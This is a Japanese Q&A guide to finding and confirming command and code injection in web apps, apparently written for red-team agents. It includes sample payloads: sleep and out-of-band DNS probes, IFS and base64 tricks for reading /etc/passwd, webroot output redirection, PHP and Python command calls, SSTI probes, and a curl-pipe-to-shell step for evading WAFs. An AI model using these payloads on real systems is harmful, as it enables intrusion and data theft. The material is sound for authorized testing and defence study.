# Web · コマンドインジェクション/コードインジェクションの特定

### 機能の意味からまず「どこがコマンドを連結し得るか」を推測する
**Q1**: 新しい Web アプリを前に、まだ注入点を見つけていない。コマンド/コードインジェクションが存在し得る場所をどこから判定すべきか?
**A1**: まず機能の意味によるプロファイリングを行う。「下層で外部プログラムやインタプリタを呼ぶ」機能はすべて本質的に高危険だ。ネットワーク診断(ping/traceroute/nslookup/whois)、ファイル変換(画像サムネイル、pdf 変換、動画トランスコード)、インポート/エクスポート(バックアップ、tar/zip、excel)、DNS/ドメイン照会、システム情報パネル、スケジュールタスク/計画、テンプレート描画/プレビュー、レポート生成。これらの機能を優先度キューに並べ、全パラメータを闇雲に fuzz しない。
**Q2**: 機能で推測するのが全パラメータ fuzz より効率的なのはなぜか?
**A2**: コマンドインジェクションの本質は「ユーザー入力が system()/exec()/popen() のような呼び出しに連結される」ことだ。外部プログラムを呼ばねば実現できない機能にのみこの連結が現れる。純粋な CRUD パラメータは SQL か ORM に入るので、コマンド区切り文字を fuzz するのは無駄だ。意味で特定すれば探査面を一桁縮小できる。
**Q3**: 高危険機能を見つけたら、最初のプローブは何を送る?
**A3**: 無害で観測可能な副作用を持つプローブを送る。区切り文字+遅延(`;sleep 5`、`|sleep 5`、`` `sleep 5` ``、`$(sleep 5)`)か帯外(`;nslookup <唯一サブドメイン>.<collab>`)。まず時間差/DNS ヒットを見るのであって、急いで `id` を送らない。多くの点はエコーがフィルタリングされていても時間/帯外チャネルは通っている。
**Q4**: 「機能で推測する」道で全高危険機能を試して反応がなければ、どうする?
**A4**: 直交次元に方向転換する。「パラメータ値」から「パラメータ外のチャネル」へ。コマンド連結は非フォーム入口で起きることが多い。アップロードファイル名、HTTP header(User-Agent/Referer/X-Forwarded-For がログ解析や運用スクリプトに入る)、cookie、XML/JSON フィールド名、multipart 境界。プローブを body パラメータからこれらの二次入口に移して打ち直す。
**Q5**: それでもなければ、そもそもコマンドインジェクションではないのか?
**A5**: 急に否定せず、もう一つの直交次元に転じる。「コマンドインジェクション」から「コードインジェクション」へ。同じテンプレートプレビュー/式計算機能が、shell を連結せずテンプレートエンジン/スクリプトインタプリタに連結されているかもしれない(SSTI、SpEL、eval)。`{{7*7}}`、`${7*7}`、`#{7*7}` のような言語層プローブに替えて再テストする。

### コマンドインジェクションのブラインドテスト:時間と帯外の二重チャネル
**Q1**: あるパラメータがコマンドインジェクションだと疑うが、ページにコマンド出力のエコーがまったくない。どう確認する?
**A1**: ブラインドテストの二重チャネルを使う。チャネル1:時間ブラインド注入。`sleep`/`ping -c N` を注入して計測可能な遅延を作り、5s と 10s でレスポンス時間が線形に変わるかを比較する。線形に変わって初めてネットワークジッタによる誤検知を排除できる。チャネル2:帯外(OAST)。DNS/HTTP を自分の collaborator に戻し、解析リクエストを受信するかを見る。
**Q2**: なぜ「線形変化」を強調し、単発の遅延を強調しないのか?
**A2**: 単発の遅延はサーバー負荷、ネットワークジッタ、元々遅い API による偽陽性かもしれない。sleep 時間を設定値に比例させ(3s→3s、7s→7s)、因果対応を作ることで初めて信頼できる判定基準になる。これはブラインド注入特定の黄金則で、SQL 時間ブラインド注入も同様だ。
**Q3**: Windows 対象には sleep がない。時間ブラインド注入をどうやる?
**A3**: 等価な遅延プリミティブに替える。`ping -n N 127.0.0.1`(毎回約 1s)、`timeout /t N`、`for /L`。Linux で sleep がフィルタリングされるなら `ping -c N`、`usleep`、大ファイルの `md5sum` を使える。特定段階では「計測可能な遅延」だけを求め、優雅さは不要だ。
**Q4**: 時間ブラインド注入も帯外も反応がない。このブラインドテストの道が断たれたらどう転じる?
**A4**: 「区切り文字/コンテキスト」次元に方向転換する。チャネルが通っていないのではなく、注入構文が閉じ切れていない。現在の payload が引用符で包まれているか区切り文字がフィルタリングされているかもしれない。複数の区切り文字マトリクス(`;` `|` `||` `&` `&&` `%0a` 改行 `` ` `` `$()`)を逐一打ち直し、前置の閉じ引用符 `'`/`"` も試す。
**Q5**: 帯外が本番環境で時間より優先されるのはなぜか?
**A5**: 時間ブラインド注入は文字ごと/判定ごとに待機が必要で、効率が極めて低く、対象に負荷をかけて監視されやすい。帯外は一度のリクエストで確定的な信号が得られ、ついでにデータを持ち出せる(コマンド出力を DNS サブドメインに入れる)。外向き通信があれば帯外を優先し、なければ時間ブラインド注入に戻る。

### 区切り文字がフィルタリングされた:逐一替え、さらに接続意味を替える
**Q1**: ある点がコマンドを実行すると確認したが、`;` がフィルタリングされた。どう続ける?
**A1**: 区切り文字は一族であって一つではない。逐一試す。`|`(パイプ)、`||`(前者が失敗したときのみ実行)、`&`(バックグラウンド)、`&&`(前者が成功したときのみ実行)、改行 `%0a`/`%0d`、`$()` コマンド置換、バッククォート、`{cmd,args}`(brace)。それぞれ shell に解析される意味が異なり、フィルタは往々にしてよくある数個しか塞いでいない。
**Q2**: 区切り文字がすべてフィルタリングされた。もう終わりか?
**A2**: 「同一コマンド内注入」(argument injection)に転じる。新しいコマンドを起動できなくても、入力が既存コマンドの引数として連結されるかもしれない。バックエンドが `ping <入力>` なら、`-f`、`--` のような追加引数を注入するか、そのプログラム自身の危険なオプションを利用する(`tar --checkpoint-action=exec`、`find -exec`、`curl -o` でファイル書き込み)。特定は「新プロセス起動」から「既存プロセス挙動のハイジャック」へ移る。
**Q3**: argument injection に見込みがあるかをどう素早く判断する?
**A3**: バックエンドが何を呼んでいるかを見る。逆算する。機能が ping なら対象は ping で、入れられる危険引数は限られる。機能が「ユーザーが tar/zip/convert にファイル名を渡す」なら、これらのプログラムには `-I`/`--use-compress-program`/delegate のような子プロセスを起動できるオプションがあり、危害が極めて大きい。特定段階ではまず「連結されるのはどのバイナリか」を識別する。
**Q4**: 連結されるバイナリをどう識別する?
**A4**: エラーエコーを誘発するのが最速だ。不正な値を渡してプログラム自身に usage/error を吐かせる(不正パスで convert にプロセッサ版を吐かせる、不正ホストで ping に特定形式を吐かせる)。エラー内のプログラム名、バージョン、引数用法が注入コンテキストを直接教えてくれる。
**Q5**: 改行 `%0a` が効くときと効かないときがある。何に依存する?
**A5**: 入力が shell の `-c` 文字列に入るか、単一 argv として execve に渡されるかに依存する。`sh -c "... $input ..."` に入れば改行/セミコロンが意味を持つ。`execve("/bin/ping",["ping",input])` のような配列呼び出しなら、shell メタ文字はすべて無効で、argument injection だけが見込みがある。この違いが特定戦略全体を決める。

### 空白がフィルタリングされた:shell コンテキストかを特定する
**Q1**: コマンド注入はできるが空白がフィルタリングされ、`cat /etc/passwd` が打てない。どうする?
**A1**: 無空白の代替を使う。`${IFS}`、`$IFS$9`、`{cat,/etc/passwd}`(brace 展開のカンマが空白を代替)、`<`/`<>` リダイレクト(`cat</etc/passwd`)、タブ `%09`。逐一試し、結果が出れば shell コンテキストにいて、字面の空白だけがフィルタリングされているとわかる。
**Q2**: これらの代替が全部失敗したら何を意味する?
**A2**: 二つの可能性がある。一つは shell コンテキストにいない(execve 配列式)ため、`${IFS}` が展開されない。もう一つはフィルタがより苛烈で `{`/`$` まで遮断している。判定基準に転じる。まず `` echo${IFS}a `` を送って `a` がエコーされるかを見る。されれば shell 内、されなければ shell メタ文字の経路を諦めて argument injection に転じる。
**Q3**: `${IFS}` は効くが `/` もフィルタリングされてパスを取れない。どうする?
**A3**: 変数連結かエンコードを使う。`cat${IFS}$(echo${IFS}L2V0Yy9wYXNzd2Q=|base64${IFS}-d)`、あるいは `cd` でディレクトリに入って相対パスを取る、あるいはワイルドカード `/???/passwd`、`/e*c/passwd` を使う。特定段階ではどの文字クラスがブラックリストかを確認し、ブラックリストを列挙してから狙って迂回する。
**Q4**: この「文字迂回」の道が全体として WAF に即座に遮断された。どう直交次元に転じる?
**A4**: 「帯外・無エコー利用」に転じる。フィルタが狙うのは「ファイル読取+エコー」のような明らかな payload なので、機密キーワードを落とさない形に変える。コマンドを注入して対象に自発的にこちらのサーバーへ接続させ、スクリプトをダウンロードして実行させる(`curl <IP>|sh` の無空白等価形)。複雑なロジックは自分のサーバーに置き、注入点は「最小の起爆」だけにする。迂回の重心を「payload 内容」から「payload 極小化+外部化」へ移す。
**Q5**: 外部化が多くのキーワードフィルタリングを迂回できるのはなぜか?
**A5**: WAF ブラックリストは payload 内に現れる機密コマンド(cat/whoami/net user)を狙うことが多い。注入点にダウンロード実行の短いチェーンだけが現れ、機密ロジックがリモートスクリプトにあれば、WAF はそれらのキーワードを見られず、当然遮断できない。これは「複雑さを検出面の外に移す」汎用の発想だ。

### コマンドインジェクションとコードインジェクションの区別
**Q1**: `{{7*7}}` か `${7*7}` が 49 を返した。これはコマンドインジェクションか?
**A1**: 違う。これはコード/式インジェクション(SSTI か EL/OGNL/SpEL)で、入力が shell でなくインタプリタに入った。判定基準:数式が評価される(49、`7*7` が結果に変わる)のは言語層の実行であり、その言語の RCE チェーン(テンプレートエンジンのエスケープから Runtime.exec)を進むべきで、直接 shell を連結しない。
**Q2**: どの言語層インジェクションかを素早く区別するには?
**A2**: プローブフィンガープリントを使う。`{{7*7}}` が 49 なら Jinja2/Twig 系、`${7*7}` が 49 なら FreeMarker/JSP EL/Spring、`#{7*7}` が 49 なら Ruby/JSF EL、`<%= 7*7 %>` なら ERB/JSP 寄り。さらにエンジン特有の payload で二重確認する(例 Jinja の `{{7*'7'}}`→7777777、Twig→49)ことでエンジン版を正確に特定する。
**Q3**: SSTI と判定した後、特定作業はどこでまだ終わらないか?
**A3**: 「サンドボックスの強度と到達可能なオブジェクト」を特定する必要がある。同じ SSTI でも RCE できるかはエンジンのサンドボックス次第だ。`config.__class__` に直接届くもの、`__builtins__` 制限を迂回する必要があるもの、FreeMarker/Velocity は Execute/Runtime クラスに直接届くことが多い。特定段階ではまずアクセス可能なクラス/メソッドを列挙し、exec までの距離を判断する。
**Q4**: 式評価も通らず、数式 payload がそのまま返る。このコードインジェクションの道が断たれたらどう転じる?
**A4**: コマンドインジェクション次元に戻る。そのまま返るのは入力がインタプリタに入っていない証拠で、shell か SQL か単なるエコーかもしれない。shell 区切り文字プローブ(`;sleep`)と SQL プローブ(`' or sleep(5)-- `)を分けて検証し、式に固執しない。
**Q5**: `7*7` が 49 を返しても偶然かもしれない(元々掛け算をするなど)。誤検知をどう排除する?
**A5**: 乱数大数の積、例えば `1337*1337` が正確に 1787569 になるかを見て、さらに文字列演算 `'a'*3`→aaa を重ねる。複数の独立プローブが言語意味に一致して初めて「API 自体が数学をする」という偶然を排除できる。特定は再現可能な因果チェーンを重視する。

### 無エコー・無外向き通信(fully blind)の特定
**Q1**: コマンドインジェクションを強く疑うが、エコーがなく、時間ブラインド注入が不安定で、帯外も受信できない(対象が外向き通信しない)。どう特定する?
**A1**: 「観測可能な状態変化」チャネルを進む。コマンドが実行されるなら、アプリが知覚できる副作用を作れる。コマンドに web ディレクトリへファイルを書かせてからアクセスする、ある API の返りを変える、資源を消費して挙動差を誘発する、エラーステータスコードの変化を誘発する。ブールブラインド注入の発想を使う。`test <条件> && sleep 5` の他に、「コマンド成功/失敗によるページ差異」を 1bit チャネルとして使う。
**Q2**: 対象が外向き通信せず、時間ブラインド注入も遅く不安定だ。信頼度をどう上げる?
**A2**: 信号振幅を大きくし対照を取る。sleep を 5s から 15-20s に上げてノイズとの距離を広げ、長遅延/短遅延/無遅延の 3 回対照を連続で取り、一貫性を見る。あるいは複数回の並行負荷テストで遅延が注入に比例して線形に重なることを確認する。特定段階では遅くても確実性を優先する。
**Q3**: 出力をこちらが読める場所に落とせないか?
**A3**: できれば最善だ。コマンド実行結果を web アクセス可能なパスにリダイレクトする(`whoami>/var/www/html/x.txt`)。その後そのファイルを直接 GET して結果を読む。ブラインド注入をエコーありに変える。前提は web ルートを特定し書き込み権限があること。これは無外向き通信環境で最も実用的な「自前エコー」の手法だ。
**Q4**: 完全に観測可能な差異がなく、このブラインド注入の道が完全に断たれた。どこへ転じる?
**A4**: 「入口/脆弱性種別」の直交次元に転じる。おそらくそもそもコマンドインジェクションではない。特定の起点に戻り、再検討する。デシリアライズか(不正なシリアライズデータを送って異常スタックを見る)、ファイルアップロード+解析か、SSRF か。誤った仮説の上で予算を消耗せず、横方向に脆弱性カテゴリを替える。
**Q5**: 確かに注入だが環境が閉鎖的すぎて検証できない場合、後続へ何を記録すべきか?
**A5**: 「疑わしい点+排除済みチャネル+コンテキスト証拠」(エラー断片、パラメータの流れ、技術スタック)を記録する。後続エージェントに「ここは execve 配列式コマンドインジェクションの疑いが強く、shell メタ文字は無効、argument injection を試すことを推奨」のような実行可能な方向転換の提案を残すのであって、単に失敗とマークしない。

### エラー情報から注入コンテキストを逆算する
**Q1**: あるパラメータに特殊文字を注入するとページがエラーを返した。このエラーを特定にどう活かす?
**A1**: エラーは特定の金鉱だ。スタック/エラーテキストに現れるキーワードを見る。`sh: 1: xxx not found` / `syntax error near unexpected token` → shell 内で注入が効いている。`Runtime.exec` / `ProcessBuilder` → Java コマンド実行。`preg_replace` / `eval()'d code` → PHP コードインジェクション。`Template` / `Jinja` / `freemarker` → SSTI。これで注入種別と言語を確定する。
**Q2**: `syntax error near unexpected token` は具体的に何を示し、どう使う?
**A2**: メタ文字が shell パーサに到達したが構文が閉じ切れていないことを示す。これは「注入が確かに shell に到達した」という強い証拠で、構文を直す(引用符を補う、区切り文字を替える)だけでエラーから実行へ進める。特定上これは沈黙の失敗よりはるかに価値がある。沈黙は未到達かもしれないが、エラーは到達を証明する。
**Q3**: エラーが一律 500 かカスタムの親切ページにされ、詳細が取れない。どうする?
**A3**: 「差異化ブラインド探査」に転じる。詳細はなくても「エラー vs 正常」自体が 1bit 信号だ。構文が正しい payload と誤った payload を 2 組作り、ステータスコード/レスポンス長/レスポンス時間の差異を観察し、パーサ挙動を逆算する。異なる層のエラー(コマンド層 vs SQL 層 vs テンプレート層)を故意に誘発し、どの層が先に崩れるかで間接的に特定もできる。
**Q4**: エラー情報が誤誘導する場合(SQL エラーを見て SQLi だと思うが、実はコマンド注入内で mysql クライアントを呼んでいるなど)は?
**A4**: 交差検証し、単一信号を軽信しない。SQL エラーを見てもコマンド区切り文字を試す。エラーが言及するコンポーネント名を単独で調べ、誰がそれを呼んでいるかを確認する。特定は「複数の独立証拠が同一結論を指す」まで下さず、表層のエラーに固着しない。
**Q5**: このエラーの道(エラー誘発で情報取得)が WAF に遮断されるか全て飲み込まれる。どこへ転じる?
**A5**: 「帯外によるコンテキスト持ち出し」に転じる。ローカルでエラーが取れないなら、対象に情報を送らせる。コマンドを注入して `id`/`uname -a`/環境変数を DNS か HTTP の帯外で出し、帯外データでローカルエラーを代替して実行コンテキストを再構築する。情報取得チャネルを「レスポンス内」から「レスポンス外」へ移す。

### Linux か Windows かの判定
**Q1**: コマンドインジェクションを確認したが、正しい payload を選ぶため、まず Linux か Windows かをどう判断する?
**A1**: クロスプラットフォームの差異プローブを送る。`sleep 5`(Linux)と `ping -n 5 127.0.0.1`(Windows)を同時に注入し、どちらが効くかでシステムがわかる。あるいは `&& echo %OS%`(Windows は Windows_NT に展開)と `&& echo $HOME` を対比する。プラットフォーム固有の展開/コマンドで判定し、当て推量しない。
**Q2**: 区切り文字の両プラットフォームでの汎用性は判定に影響するか?
**A2**: `&`、`&&`、`|`、`||` は両プラットフォーム共通。`;` は *nix のみ(cmd.exe では `;` は区切りにならない)。改行は Windows では `%0d%0a` が必要。`;` が効けばほぼ Linux。`&`/`|` だけが効くなら両方の可能性があり、コマンドプローブでさらに区別する必要がある。
**Q3**: Windows と判定した後の特定の重点はどう違う?
**A3**: cmd か powershell かのコンテキストに注目する(引用符/エスケープ/パイプ意味に影響)。IIS/ミドルウェア身元で実行されているか(初期権限を決める)、パス区切り `\` とドライブ文字に注目する。Windows の `%VAR%` vs PowerShell の `$env:VAR` の展開差異も shell 種別をさらに特定するプローブになる。
**Q4**: プラットフォーム判定プローブが全てフィルタリングされた。どう転じる?
**A4**: 「技術スタックの傍証による推測」に転じる。Server header、エラーページの傾向、パスの大文字小文字感度(Linux は敏感、Windows は非敏感)、ファイル拡張子、Cookie 命名などの傍証から OS を推測し、対応 payload を選んで打つ。判定根拠を「直接コマンドエコー」から「HTTP 層フィンガープリント」へ移す。
**Q5**: パスの大文字小文字感度がなぜ OS プローブになるか?
**A5**: `/Index.php` と `/index.php` にアクセスすると、Linux は厳密に区別し(一方が 404、他方が 200)、Windows/macOS は既定で区別しない(どちらも 200)。これは注入点に依存せず純粋な HTTP だけで得られる OS 傍証で、注入プローブが遮断されたときに有用だ。

### PHP コードインジェクションの落点特定
**Q1**: 対象が PHP で、コマンドインジェクションでなくコードインジェクションだと疑う。よくある落点はどこか?
**A1**: PHP コードインジェクションの高危険な集中点は、`eval()`、`assert()`(旧版は文字列を実行)、`preg_replace` の `/e` 修飾子付き(PHP<7)、`create_function()`、`call_user_func`/コールバック制御可能、`include`/`require` と `data://`/`php://` 擬似プロトコルの併用、デシリアライズ `unserialize()`。特定時は入力がこれらの関数に入り得るかを見る。
**Q2**: `eval` 系コードインジェクションに命中したかをどう探査する?
**A2**: PHP 構文プローブを送る。`;phpinfo();`、`system('id');`、`${@print(md5(1))}`(md5 がエコーされるか)、あるいは閉じ系プローブ `');...//`。phpinfo か md5 結果が返れば、入力が PHP インタプリタに入った証拠だ。前方の構文(引用符、括弧、セミコロン)を正しく閉じる必要があることに注意する。
**Q3**: PHP の `system()`/`exec()`/`` `` ``/`shell_exec` が disable_functions で無効化されている。それでもコードインジェクションか?
**A3**: 依然コードインジェクションだが、「コード→コマンド」の橋が断たれただけだ。disable_functions 迂回に転じる。LD_PRELOAD と mail/putenv の併用、FFI、imap_open、PHP-FPM の利用/拡張の迂回、あるいは純 PHP 実装のファイル/ネットワーク操作。特定の重点を「システムコマンドを実行できるか」から「コード実行の境界内で他に何ができるか」へ移す。
**Q4**: コードインジェクション探査の道が全て失敗し、PHP 構文プローブがそのまま出力される。どう転じる?
**A4**: コマンドインジェクションかファイルインクルード次元に転じる。そのまま出力されるのは eval に入っていない証拠だ。入る先が `include` か(`php://filter/convert.base64-encode/resource=index.php` でソースを読む)、shell か(コマンド区切り文字)、テンプレートかを測る。PHP アプリでは LFI とコマンドインジェクションが eval より一般的なことが多い。
**Q5**: ソースを読めた後、どう特定に逆活用する?
**A5**: ホワイトボックス監査で即座に戦場を絞る。`eval|assert|system|exec|preg_replace.*e|unserialize|include.*\$` を grep し、制御可能な変数を入口パラメータまで遡って、注入点と必要な閉じ構文を正確に特定する。ブラックボックスの盲打ちからホワイトボックスの正確打撃への格上げは、ソース取得後の最優先動作だ。

### 引用符の閉じとコンテキスト判定
**Q1**: コマンドインジェクションのプローブが反応しない。入力が引用符で包まれていると疑う。コンテキストをどう判断する?
**A1**: コンテキストが閉じ方を決める。プローブを送る。直接注入が無効なら、前置 `'` か `"` で閉じを試す。`';sleep 5;'` が効いて `;sleep 5` が効かなければ、入力はシングルクォート内にあり、先に閉じる必要がある。体系的に、裸注入/シングルクォート閉じ/ダブルクォート閉じ/バッククォート内の 4 コンテキストを網羅して試す。
**Q2**: シングルクォートとダブルクォートのコンテキストは payload にどんな実影響があるか?
**A2**: ダブルクォート内では `$()`、`` ` ``、`$var` が依然 shell に展開される。シングルクォート内ではすべて字面化される。だからダブルクォート内なら `"$(sleep 5)"` が閉じずに直接効く。シングルクォート内なら先に `'` を閉じないと注入できない。どの引用符内かを判断することが最短有効 payload を直接決める。
**Q3**: 一つのプローブで引用符コンテキストを同時に探るには?
**A3**: `` `sleep 5` `` か `$(sleep 5)` を閉じずに先に打つ。効けばダブルクォートか裸のコンテキスト。効かなければ `'`/`"` 接頭辞を付けて打ち直し、どの接頭辞で sleep が効くかがその引用符だ。段階的に近づき、毎回一変数だけ変え、どの組み合わせが遅延を誘発するかを記録する。
**Q4**: 各種引用符閉じの組み合わせを全て試しても無効だ。どの次元に転じる?
**A4**: 「入力がそもそも shell 文字列に入っていない」仮説に転じる。つまり execve 配列式呼び出しで、どう引用符を閉じても shell 解析がない。このとき引用符ゲームを諦め、argument injection(`-` 始まりの引数を注入)に転じるか、入口/脆弱性種別を替える。引用符で無限に組み合わせを並べない。
**Q5**: なぜ引用符の組み合わせを無限に総当たりしてはいけないか?
**A5**: 引用符コンテキストは本質的に有限数(裸/シングル/ダブル/バッククォート/ネスト)しかない。4-5 種を試して無効なら、続けても限界利益はゼロに近く、「ここは shell 連結ではない」という強い信号だ。レッドチームはタイムリーに損切りして仮説を切り替える規律が必要で、死点で時間予算を使い切らない。

### 本当のパラメータ落点の特定(パラメータ汚染/複数パラメータ)
**Q1**: API に複数パラメータがあり、注入プローブに反応はあるが、どのパラメータが誘発したか不明だ。どう特定する?
**A1**: パラメータを一つずつ分離して二分する。一度に一つのパラメータだけにプローブを置き(sleep/帯外の一意識別子)、他は正常値にして、どれが誘発するかを見る。パラメータが多いなら二分する。先に半数にプローブを置き、範囲を絞る。各パラメータに一意の collaborator サブドメインを番号付けすれば、一度のリクエストでどれが命中したか区別できる。
**Q2**: 二つのパラメータが同一コマンドに連結され、単独では誘発せず一緒に置くと誘発する。どうする?
**A2**: これは連結依存の場面で、注入点がパラメータをまたぐかもしれない(前のパラメータが閉じ、後が注入)。組み合わせを試す。パラメータ A に閉じ引用符/区切り文字、パラメータ B にコマンドを置く。`A=x'`、`B=;sleep 5` のように分担させる。特定時はコマンドが複数パラメータを順に連結して成ることを考慮する。
**Q3**: HTTP パラメータ汚染(同名パラメータ複数)は特定に影響するか?
**A3**: する。バックエンドが最初/最後/連結のどれを取るかはフレームワークで異なる。`a=1&a=;sleep5` を試し、ミドルウェアが二つの値をカンマで連結するか特定の一つを取るかで、最初の値だけを検証するフィルタを迂回できるかもしれない。特定時は HPP を「前置フィルタを迂回して注入点に到達する」手段としてテストする。
**Q4**: 全パラメータを単独と組み合わせで試しても反応がない。この「body パラメータ」の道が断たれたらどう転じる?
**A4**: 「body 以外の入力源」に転じる。探査をクエリ/フォームパラメータから、HTTP header(特に UA、XFF、Host、Referer)、Cookie、JSON ネストフィールド、XML ノード、アップロードファイル名/メタデータ、URL パスセグメントへ移す。コマンドインジェクションの入口は開発者が「悪意のある入力はない」と思う二次チャネルに多い。
**Q5**: なぜ二次チャネルのほうがむしろよく当たるのか?
**A5**: 開発者は明示的なフォームパラメータには往々にしてフィルタをかけるが、header/ファイル名/ログフィールドは疎かにし、これらが運用スクリプト、ログ解析、画像処理プログラムに二次消費されてコマンドに連結される。この種の「データフローが複数段階を経る」点はコマンドインジェクションの激戦区で、特定時はデータの全ライフサイクルを追う必要がある。

### アップロード/解析系が誘発するコマンドインジェクション
**Q1**: 対象に画像/文書のアップロードと処理機能がある。処理段階のコマンドインジェクションを疑う。どう特定する?
**A1**: プロセッサが鍵だ。サムネイル/変換は往々にして ImageMagick、GraphicsMagick、ffmpeg、LibreOffice、Ghostscript、exiftool を呼ぶ。これらは歴史的に解析即実行の脆弱性がある(ImageMagick の delegate/MSL、Ghostscript の -dSAFER 迂回など)。まずプロセッサとバージョンを識別し、対応する不正ファイルのプローブを送る。
**Q2**: バックエンドがどのプロセッサを使うかをどう識別する?
**A2**: アップロード後の出力ファイルのメタデータ(exif に Software フィールドが残りがち)、出力形式の特徴、エラー情報、処理時間の特徴を見る。あるいは各プロセッサ固有の不正サンプルをアップロードし、どれが特有のエラーを誘発するかを見る。具体的なプロセッサ+バージョンを識別して初めて対応する既知の注入ベクタを調べられる。
**Q3**: ファイル内容の注入が効かない。ファイル名注入を試すか?
**A3**: 試す。バックエンドがファイル名をコマンドに連結するなら(`convert <ファイル名> out.png`)、ファイル名内の `;`/`$()`/`|` が注入できるかもしれない。`x;sleep5.jpg` や `$(sleep 5).jpg` という名前でアップロードして遅延を観察する。ファイル名注入は見落とされがちだが極めて有効で、特に運用/バックアップスクリプトがアップロードディレクトリを処理する場合だ。
**Q4**: プロセッサが識別できず、不正ファイルもファイル名も誘発しない。どこへ転じる?
**A4**: 「保存型/二段階誘発」次元に転じる。アップロードしたファイルはアップロード瞬間に処理されず、スケジュールタスク、管理者プレビュー、別 API の二次消費時にコマンドに連結されるかもしれない。帯外プローブを埋めたファイルを置いた後、他の機能(バックグラウンドプレビュー、エクスポート、スキャン)を誘発するか、遅延誘発を待ち、collaborator を監視する。
**Q5**: なぜ二段階誘発は見落とされやすいか?
**A5**: アップロードレスポンスは即座に成功を返し、注入の実行は別の時間/別のプロセスで起きるため、リクエスト-レスポンスを直接関連付けられない。この種の点をブラインドテストするには「持続的な帯外ビーコン」(一意サブドメイン)を使い、同期の時間ブラインド注入ではなく、消費し得る側を能動的に誘発して時間次元を特定に組み込む必要がある。

### Node.js コードインジェクションの落点
**Q1**: 対象が Node.js/Express で、コードインジェクションを疑う。落点はどこか?
**A1**: Node の危険な集中点は、`child_process` の exec/execSync(shell を連結)、`eval`/`Function()`、`vm`/`vm2` サンドボックス(vm2 には複数のエスケープ CVE)、テンプレートエンジン(pug/ejs/handlebars の SSTI)、`require` 制御可能、プロトタイプ汚染による間接 RCE。まずコマンド層(child_process.exec)かコード層(eval/vm)かを見る。
**Q2**: child_process.exec か純 JS の eval かをどう区別する?
**A2**: exec は `/bin/sh -c` を経由し、shell メタ文字(`;`、`$()`)が効く。eval は JS 評価で、`7*7`→49、`process.mainModule` に到達でき、shell メタ文字は無意味だ。`require('child_process').execSync('id')` 系プローブを送って JS 層かを見、`;id` を送って shell 層かを見、分けて判定する。
**Q3**: SSTI(pug/handlebars など)と判定した。RCE 経路の特定で何に注意する?
**A3**: Node SSTI の RCE は多くの場合 `global.process.mainModule.require('child_process')` を経由する。エンジンごとにエスケープ構文が異なり、handlebars は helper 呼び出しチェーンを組む必要があり、pug は JS をインライン化できる。特定段階ではまず `process`/`global`/`require` という重要オブジェクトに到達できるかを確認する。それらが RCE へのハブだ。
**Q4**: プロトタイプ汚染を疑うが直接の RCE プローブが無効だ。どう転じる?
**A4**: プロトタイプ汚染は多くが二段階/間接的だ。まず `__proto__` の属性を汚染し、その属性への危険な使用(コマンドへの連結、テンプレートコンパイルオプションへの影響)で起爆する。「二段階特定」に転じる。第一段階は汚染成功の検証(探査属性を汚染して全体に反映されるか)、第二段階は gadget(汚染属性を消費する危険点)を探す。
**Q5**: Node コードインジェクションの全プローブが無効だ。完全に転じる?
**A5**: API 層の他の脆弱性に転じる。Node アプリの RCE が不発なら、SSRF、NoSQL 注入(`$where`/`$gt`)、JWT 弱鍵、依存の脆弱性がより現実的な突破口であることが多い。Node=必ず RCE と決めつけず、攻撃面の費用対効果を横断評価し、証拠がより強い方向へ予算を振り向ける。

### Python コードインジェクションの落点
**Q1**: 対象が Python アプリで、コードインジェクションを疑う。危険な集中点はどこか?
**A1**: `eval`/`exec`/`compile` の直接実行、`pickle`/`yaml.load`(safe_load でない)のデシリアライズ、`subprocess`/`os.system`/`os.popen`(コマンド層)、`str.format`/f-string のユーザー制御(フォーマット文字列注入でオブジェクト漏えい)、Jinja2 SSTI、`__import__`。まず入力がインタプリタ(eval/exec)、シリアライザ(pickle)、shell(subprocess)のどれに入ったかを判断する。
**Q2**: Python の eval/exec 注入をどう探査する?
**A2**: `__import__('os').system('sleep 5')` か式 `7*7`、`().__class__.__bases__` のクラスプローブを送る。Jinja2 SSTI なら `{{7*7}}`、`{{''.__class__.__mro__}}` を使う。オブジェクト構造か遅延が返れば Python 層に入ったと確認できる。Python3 では多くの旧 payload(`__subclasses__` のインデックスなど)が版で異なることに注意する。
**Q3**: Jinja2 SSTI と判定したが `__builtins__` が制限されている。利用可能なチェーンをどう特定する?
**A4**: 到達可能なオブジェクトを列挙して gadget を探す。`''.__class__` か `request`/`config` から出発し、`__mro__`/`__subclasses__` を辿って `os`/`subprocess`/`__import__` に届くクラス(`subprocess.Popen`、warnings 関連クラスなど)を探す。特定作業は「制限されたサンドボックス内でコマンド実行へのオブジェクトチェーンを探索する」ことで、これ自体が核心の難点だ。
**Q4**: `str.format` 注入をどう特定するか。RCE できるか?
**A4**: ユーザーがフォーマット文字列を制御する場合(`"{0.__class__}".format(obj)`)、通常は属性の読み取り/機密オブジェクトの漏えい(config、secret など)しかできず、直接 RCE は難しいが情報漏えいで後続を補助できる。特定の判定基準: `{0}`/`{user.__class__}` を注入してオブジェクトが漏れるかを見る。情報漏えい型なので、特定時は「直接 RCE」ではなく「補助」に分類する。
**Q5**: Python コードインジェクションの道が全て断たれた。どこへ転じる?
**A5**: デシリアライズ次元に転じる。Python アプリに pickle/PyYAML/カスタムシリアライズ(session、キャッシュ、メッセージキュー)があれば、不正なシリアライズデータを送って異常を観察する。eval より RCE を達成しやすいことが多い。あるいは SSTI 以外のテンプレート/SQL/SSRF に転じる。特定の重心を「式実行」から「オブジェクトデシリアライズ」へ移す。

### エンコード層の迂回特定
**Q1**: コマンドインジェクションのプローブが全て WAF に遮断された。エンコード層の迂回ができていないと疑う。有効なエンコードをどう特定する?
**A1**: エンコード層を体系的に試す。URL エンコード(`%3B`=;)、二重 URL エンコード(`%253B`、複数層デコードがあるとき)、Unicode/overlong、大文字小文字混在、HTML エンティティ、base64 とデコードコマンドの併用。鍵は「デコードがフィルタの前か後か」の判断だ。アプリが先にデコードしてからフィルタするならエンコードは無駄。先にフィルタしてからデコードするならエンコードが迂回できる。
**Q2**: デコードとフィルタの順序をどう判断する?
**A2**: 単エンコードプローブを送って遮断されるかを見る。`%3Bsleep5` が遮断されれば=先にデコード後フィルタ(エンコード無効、別の迂回が必要)。`%3B` が通るが字面扱いなら=デコードされない。二重エンコード `%253B` が通り且つ効くなら=複数層デコードがあり、「第一層でフィルタ、第二層でデコード」の窓に命中している。異なるエンコード層数で逐一この窓を探る。
**Q3**: コマンド自体のキーワード(sleep/curl)が遮断される。コマンド内容をエンコードするのは?
